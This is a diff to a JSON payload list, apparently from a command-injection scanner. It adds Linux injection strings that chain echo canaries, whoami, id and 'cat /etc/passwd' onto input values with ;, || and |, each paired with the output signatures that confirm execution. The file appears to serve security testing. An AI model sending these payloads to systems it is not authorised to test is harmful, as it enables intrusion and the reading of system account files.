@@ -120,6 +120,16 @@
 
         {"payload": "x||ping+-c+5+127.0.0.1||", "type": "Linux plus-encoded ping double-OR"},
         {"payload": "x||sleep+5||", "type": "Linux plus-encoded sleep double-OR"},
-        {"payload": "x||echo+rce_test_8888||", "type": "Linux plus-encoded echo double-OR"}
+        {"payload": "x||echo+rce_test_8888||", "type": "Linux plus-encoded echo double-OR"},
+
+        {"payload": "; echo RCE_CANARY_ECHO_TEST", "type": "Linux semicolon canary", "canary": "RCE_CANARY_ECHO_TEST"},
+        {"payload": "|| echo RCE_CANARY_ECHO_TEST", "type": "Linux OR canary", "canary": "RCE_CANARY_ECHO_TEST"},
+        {"payload": "| echo RCE_CANARY_ECHO_TEST", "type": "Linux pipe canary", "canary": "RCE_CANARY_ECHO_TEST"},
+        {"payload": "; whoami", "type": "Linux semicolon signature", "signatures": ["root", "www-data", "apache", "nginx", "daemon"]},
+        {"payload": "|| whoami", "type": "Linux OR signature", "signatures": ["root", "www-data", "apache", "nginx", "daemon"]},
+        {"payload": "; id", "type": "Linux semicolon id signature", "signatures": ["uid=0(root)", "gid=0(root)", "uid="]},
+        {"payload": "|| id", "type": "Linux OR id signature", "signatures": ["uid=0(root)", "gid=0(root)", "uid="]},
+        {"payload": "; cat /etc/passwd", "type": "Linux semicolon passwd", "signatures": ["root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:"]},
+        {"payload": "|| cat /etc/passwd", "type": "Linux OR passwd", "signatures": ["root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:"]}
     ]
 }
